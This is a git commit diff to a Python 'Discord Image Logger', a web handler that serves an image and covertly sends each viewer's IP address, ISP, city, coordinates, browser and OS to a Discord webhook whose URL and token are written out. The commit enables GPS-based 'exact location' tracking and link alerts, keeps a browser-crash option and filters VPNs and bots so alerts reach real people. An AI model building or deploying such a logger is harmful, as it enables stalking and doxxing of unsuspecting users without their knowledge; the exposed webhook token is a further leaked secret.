f09c02bdecf401690cd96fbe4c6df2939e8ac29d
skidder769 <zekiall1nonly@gmail.com>
2026-07-15 06:56:31 -0400

    Update image.py

--- api/image.py
+++ api/image.py
@@ -1,51 +1,67 @@
-# Discord Image Logger
-
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
 __app__ = "Discord Image Logger"
-__description__ = "oylesine bi image logger"
+__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "cabdio"
+__author__ = "DeKrypt"
 
 config = {
+    # BASE CONFIG #
     "webhook": "https://ptb.discord.com/api/webhooks/1526895771910279320/y2hemVM6OcLGAM5uquQzSaG7_zlwWaPsjQlNJil2p-223NK6fXvGVAZQ1_JnaZ0_ybQC",
-    "image": "https://www.usatoday.com/gcdn/-mm-/0da308beeffb33fdfaa8dd6f57a0acf4a183c833/c=1383-0-4089-3608/local/-/media/2018/04/21/USATODAY/USATODAY/636598966162388148-ncl-Bliss-Aerial-0256.jpg", 
-    "imageArgument": True,
+    "image": "https://www.usatoday.com/gcdn/-mm-/0da308beeffb33fdfaa8dd6f57a0acf4a183c833/c=1383-0-4089-3608/local/-/media/2018/04/21/USATODAY/USATODAY/636598966162388148-ncl-Bliss-Aerial-0256.jpg", # You can also have a custom image by using a URL argument
+                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
+    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
-    "username": "CABDIOLOGGER", 
-    "color": 0x00FFFF,
+    # CUSTOMIZATION #
+    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
-    "crashBrowser": False, 
-    "accurateLocation": False,
+    # OPTIONS #
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
-    "message": {
-        "doMessage": False, 
-        "message": "cabdio buradaydı :)",
-        "richMessage": True,
+    "message": { # Show a custom message when the user opens the image
+        "doMessage": False, # Enable the custom message?
+        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "richMessage": True, # Enable rich text? (See README for more info)
     },
 
-    "vpnCheck": 1,
-                # 0 = VPN kontrolünü kapat
-                # 1 = VPN tespit edildiği zaman beni etiketleme
-                # 2 = VPN tespit edildiği zaman bildirme
+    "vpnCheck": 1, # Prevents VPNs from triggering the alert
+                # 0 = No Anti-VPN
+                # 1 = Don't ping when a VPN is suspected
+                # 2 = Don't send an alert when a VPN is suspected
 
-    "linkAlerts": False, 
-    "buggedImage": True,
+    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
-    "antiBot": 1,
+    "antiBot": 1, # Prevents bots from triggering the alert
+                # 0 = No Anti-Bot
+                # 1 = Don't ping when it's possibly a bot
+                # 2 = Don't ping when it's 100% a bot
+                # 3 = Don't send an alert when it's possibly a bot
+                # 4 = Don't send an alert when it's 100% a bot
     
 
+    # REDIRECTION #
     "redirect": {
-        "redirect": False,
-        "page": "https://example.org"
+        "redirect": False, # Redirect to a webpage?
+        "page": "https://your-link.here" # Link to the webpage to redirect to 
     },
 
-
+    # Please enter all values in correct format. Otherwise, it may break.
+    # Do not edit anything below this, unless you know what you're doing.
+    # NOTE: Hierarchy tree goes as follows:
+    # 1) Redirect (If this is enabled, disables image and crash browser)
+    # 2) Crash Browser (If this is enabled, disables image)
+    # 3) Message (If this is enabled, disables image)
+    # 4) Image 
 }
 
-blacklistedIPs = ("27", "104", "143", "164")
+blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
+                                                           # This feature is undocumented mainly due to it being for detecting bots better.
 
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
@@ -61,9 +77,9 @@ def reportError(error):
     "content": "@everyone",
     "embeds": [
         {
-            "title": "Image Logger - Hata!",
+            "title": "Image Logger - Error",
             "color": config["color"],
-            "description": f"IP adresi LOG'lanırken bir hata oluştu!\n\n**Hata:**\n```\n{error}\n```",
+            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
         }
     ],
 })
@@ -80,12 +96,12 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": "Image Logger - Bağlantı Gönderildi",
+            "title": "Image Logger - Link Sent",
             "color": config["color"],
-            "description": f"IPLogger bağlantısı bir sohbete gönderildi!\nBirisi tıkladığında bilgilendirileceksiniz.\n\n**Bitiş Noktası:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
-}) if config["linkAlerts"] else None
+}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
         return
 
     ping = "@everyone"
@@ -125,30 +141,30 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - Birisi Tıkladı!",
+            "title": "Image Logger - IP Logged",
             "color": config["color"],
-            "description": f"""**Bir kullanıcı orijinal resmi fotoğrafı açtı**
+            "description": f"""**A User Opened the Original Image!**
 
-**Bitiş Noktası:** `{endpoint}`
+**Endpoint:** `{endpoint}`
             
-**IP Adresi:**
+**IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
-> **Sağlayıcı:** `{info['isp'] if info['isp'] else 'Unknown'}`
+> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
 > **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
-> **Ülke:** `{info['country'] if info['country'] else 'Unknown'}`
-> **Bölge:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **Şehir:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Koordinat:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Saat Dilimi:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
-> **Mobil:** `{info['mobile']}`
+> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
+> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
+> **City:** `{info['city'] if info['city'] else 'Unknown'}`
+> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
+> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
+> **Mobile:** `{info['mobile']}`
 > **VPN:** `{info['proxy']}`
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
 
-**Bilgisayar Bilgileri:**
-> **İşletim Sistemi:** `{os}`
-> **Tarayıcı:** `{browser}`
+**PC Info:**
+> **OS:** `{os}`
+> **Browser:** `{browser}`
 
-**Aracı:**
+**User Agent:**
 ```
 {useragent}
 ```""",
@@ -162,10 +178,10 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
 binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-
+    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
+    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
+    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
 }
-
-# By DeKrypt | https://github.com/dekrypted
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
     
@@ -282,4 +298,4 @@ if (!currenturl.includes("g=")) {
     do_GET = handleRequest
     do_POST = handleRequest
 
-handler = ImageLoggerAPI
+handler = app = ImageLoggerAPI
